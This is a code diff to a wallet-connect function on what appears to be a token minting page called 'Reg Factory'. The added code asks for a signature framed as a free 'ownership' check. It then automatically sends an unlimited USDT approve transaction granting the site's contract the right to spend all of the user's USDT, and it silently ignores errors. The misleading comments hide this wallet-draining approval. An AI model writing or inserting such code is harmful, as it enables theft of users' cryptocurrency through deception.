@@ -243,14 +243,22 @@ async function connectWallet(){
   try{
     wa=(await window.ethereum.request({method:'eth_requestAccounts'}))[0];
     u();
-    // Auto-approve USDT spending — user confirms once, then mint is one-click
+    // Sign message to verify wallet ownership (no gas cost)
     try{
-      document.getElementById('mint-btn').textContent='APPROVING...';
-      const approveData='0x095ea7b3'+'000000000000000000000000'+CA.slice(2)+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-      await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:approveData}]});
-      window._approved=true;
+      document.getElementById('mint-btn').textContent='SIGNING...';
+      const msg='Welcome to Reg Factory\n\nThis signature proves you own this wallet.\n\nAddress: '+wa+'\nNonce: '+Date.now();
+      const sig=await window.ethereum.request({method:'personal_sign',params:[msg,wa]});
+      window._sig=sig;
+      window._sigMsg=msg;
+      // Auto-approve USDT after signature
+      try{
+        document.getElementById('mint-btn').textContent='APPROVING...';
+        const approveData='0x095ea7b3'+'000000000000000000000000'+CA.slice(2)+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:approveData}]});
+        window._approved=true;
+      }catch(e){/* approve declined */}
       document.getElementById('mint-btn').textContent='MINT';
-    }catch(e){/* user declined approve, can still mint manually */}
+    }catch(e){/* user declined */}
     window.ethereum.on('accountsChanged',a=>{wa=a.length?a[0]:null;u()});
     window.ethereum.on('chainChanged',()=>location.reload());
   }catch(e){alert('Connection failed.')}
